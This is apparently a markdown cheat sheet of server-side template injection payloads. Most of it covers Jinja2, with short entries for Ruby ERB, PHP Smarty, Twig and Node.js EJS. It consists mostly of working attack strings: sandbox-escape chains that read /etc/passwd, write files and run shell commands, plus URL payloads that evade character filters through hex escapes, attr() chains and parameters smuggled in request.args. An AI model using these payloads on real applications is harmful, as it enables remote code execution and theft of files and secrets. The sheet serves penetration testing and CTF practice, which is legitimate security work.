# SSTI
- Identify Template Engine
  ![](https://miro.medium.com/max/701/1*3hIShkWH_gjOt1b0LNPURQ.png)
- Jinja2
  > [Flask default template engine (doc)](https://jinja.palletsprojects.com/en/3.1.x/)  
  > [Exploiting Jinja SSTI with limited payload size.](https://niebardzo.github.io/2020-11-23-exploiting-jinja-ssti/)  
  > [GreHack 2021 - Optimizing Server Side Template Injections payloads for jinja2](https://podalirius.net/en/publications/grehack-2021-optimizing-ssti-payloads-for-jinja2/)  
  > [RCE-bypassing-as-much-as-I-possibly-can](https://hackmd.io/@Chivato/HyWsJ31dI#RCE-bypassing-as-much-as-I-possibly-can)  
  > [On SSTI & bypass of jinja2](https://chowdera.com/2020/12/20201221231521371q.html)  
  > [Builtin Filters](https://medium.com/@nyomanpradipta120/jinja2-ssti-filter-bypasses-a8d3eb7b000f)

  - Get `os`
    - `{{lipsum.__globals__.os}}`
    - `{{cycler.__init__.__globals__.os}}`
  - Load `os`
    - `{{config.from_object('os')}}`
  - `{{ config }}`
    - config.SECRET\_KEY
    - config.from\_pyfile(filename)
  - `{{ request }}`
    - request.args.name
    - request.cookies.name
    - request.headers.name
    - request.values.name
    - request.form.name
  - sandbox bypass

    ```python
    #All the below payloads works under python2
    --------------------------------------------

    #Starting from string or list
    {{ ''.__class__.__base__ }}

    #File operation
    {{ ''.__class__.__mro__[2].__subclasses__() }}
    {{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
    {{ ''.__class__.__mro__[2].__subclasses__()[40]('/var/www/app/a.txt').write('test') }}
    
    #RCE
    {{ ''.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen('id').read() }}
    > uid=1000(ubuntu)gid=1000(ubuntu)...

    #All the below payloads works under python3
    --------------------------------------------
    {{ ().__class__.__base__.__subclasses__() }}
    {{ ().__class__.__base__.__subclasses__()[132] }} #<class 'os._wrap_close'>
    {{ ().__class__.__base__.__subclasses__()[132].__init__.__globals__ }}
    {{ ().__class__.__base__.__subclasses__()[132].__init__.__globals__['system']('id') }}

    #Find eval
    {% for c in [].__class__.__base__.__subclasses__(): %}
      {% if c.__name__ == 'catch_warnings': %}
        {% for b in c.__init__.__globals__.values(): %}
          {% if b.__class__ == {}.__class__ %}
            {% if 'eval' in b.keys(): %}
              {{ b['eval']('__import__("os").popen("id").read()') }}
            {% endif %}
          {% endif %}
        {% endfor %}
      {% endif %}
    {% endfor %}

    #Import
    {% for x in ().__class__.__base__.__subclasses__() %}
      {% if "warning" in x.__name__ %}
        {{x()._module.__builtins__["__import__"]("os").popen(request.args.payload).read()}}
      {% endif %}
    {% endfor %}
    ```

  - Bypass
    - `.`

      ```txt
      /?ssti={{libsum['__globals__']['os']}}
      ```

    - `.` `_`

      ```txt
      /?ssti={{lipsum['\x5f\x5fglobals\x5f\x5f']['os']}}
      ```

    - `.` `_` `[` `]`

      ```txt
      /?ssti={{lipsum|attr('\x5f\x5fglobals\x5f\x5f')|attr('os')}}
      ```

    - `.` `_` `[` `]` `|`

      ```txt
      /?ssti={{getattr(getattr(lipsum,'\x5f\x5fglobals\x5f\x5f'), 'os')}}
      ```

    - `.` `_` `[` `]` `{{` `}}`

      ```txt
      /?ssti={%if lipsum|attr('\x5f\x5fglobals\x5f\x5f')|attr('os') %}{%endif%}
      ```

    - length or other special characters (`'` `"`)

      ```txt
      /?ssti={{lipsum[request.args.param1][request.args.param2]}}&param1=__globals__&param2=os

      /?ssti={{config.update(payload=request.args.param1)}}&param1=ls
      /?ssti={{lipsum.__globals__.os.popen(config.payload)}}
      ```
- Ruby erb
  - `<%= system('id') %>`
- PHP Smarty
  - `{ system('id') }`
- PHP Twig
  - `{{ ['id'] | filter('system') }}`
- Node.js ejs
  - `<%= global.process.mainModule.require("child_process").execSync("id").toString() %>`
- Format String Attack
